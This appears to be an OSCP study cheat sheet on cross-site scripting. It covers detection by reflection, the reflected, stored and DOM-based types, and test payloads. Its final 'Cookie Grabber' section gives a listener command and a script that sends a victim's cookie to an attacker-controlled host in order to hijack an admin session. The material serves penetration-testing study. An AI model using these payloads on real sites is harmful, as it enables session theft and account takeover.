# 🛡️ XSS (Cross-Site Scripting)

### 📌 What it is
XSS is an injection vulnerability where an attacker "tricks" a website into executing malicious JavaScript in a victim's browser. The browser thinks the script came from the trusted website, so it allows the script to access cookies, session tokens, or perform actions as that user.

### 🚩 The "Dead Giveaway" (How to find it)
The "Holy Grail" of XSS identification is **Reflection**. 
If you type a unique string (like `XSS_TEST_123`) into a search bar, a URL parameter, or a profile field, and that **exact string appears in the page's HTML source**, the site is likely vulnerable.

**The Test:**
1. Input: `<u>XSS</u>`
2. Result: If the word "XSS" appears **underlined** on the page, the site is rendering your HTML.
3. Next Step: Replace `<u>` with `<script>alert(document.cookie)</script>`.

---

### ⚡ The 3 Types (Quick Ref)

1. **Reflected (Non-Persistent):**
   - **Where:** URL parameters (`?search=test`).
   - **Action:** The script "bounces" off the server and executes immediately.
   - **Requirement:** You must trick a victim into clicking a specific link.

2. **Stored (Persistent):**
   - **Where:** Databases, Comments, User Bios, Support Tickets.
   - **Action:** The script is saved on the server.
   - **Danger:** Anyone who visits the page (including Admins) gets infected automatically. **(OSCP Priority #1)**.

3. **DOM-based:**
   - **Where:** Client-side JavaScript (URL fragments after the `#`).
   - **Action:** The vulnerability is in the browser's local code, not the server's response.
   - **Example:** `http://site.com/#name=<script>alert(1)</script>`

---

### 🎣 The "Cookie Grabber" (OSCP Listener Setup)
Once you find Stored XSS, use this to steal the Admin's session.

1. **Start your listener (on your Kali box):**
   `python3 -m http.server 80`

2. **Inject the Payload:**
   <script>fetch('http://<YOUR_KALI_IP>/log?c=' + btoa(document.cookie));</script>

3. **Check your Python logs:**
   You will see a GET request. Take the `c=` value, base64 decode it, and you have the Admin's session cookie.